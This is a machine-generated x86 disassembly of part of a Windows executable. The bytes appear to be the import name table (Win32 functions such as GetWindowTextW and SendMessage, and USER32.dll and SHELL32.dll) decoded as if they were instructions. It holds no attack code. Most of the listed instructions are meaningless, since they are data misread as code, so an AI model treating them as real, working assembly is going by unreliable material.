  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
